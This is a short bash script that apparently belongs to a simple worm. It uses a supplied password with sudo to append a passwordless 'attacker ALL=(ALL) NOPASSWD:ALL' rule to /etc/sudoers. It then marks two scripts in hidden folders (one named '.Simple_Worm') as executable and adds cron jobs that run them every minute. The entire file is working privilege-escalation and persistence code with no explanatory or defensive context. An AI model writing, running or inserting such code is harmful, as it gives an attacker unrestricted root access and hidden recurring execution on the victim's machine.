#!/bin/bash

echo $1

touch /home/attacker/record.txt

echo $1 | \
	sudo -S bash -c "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"

chmod +x /home/attacker/Desktop/.Backup/test_p1.sh
chmod +x /home/attacker/Public/.Simple_Worm/Loop/test_p2.sh

(crontab -l 2>/dev/null || true; echo "*/1 * * * * /home/attacker/Desktop/.Backup/test_p1.sh") | crontab -
(crontab -l 2>/dev/null || true; echo "*/1 * * * * /home/attacker/Public/.Simple_Worm/Loop/test_p2.sh") | crontab -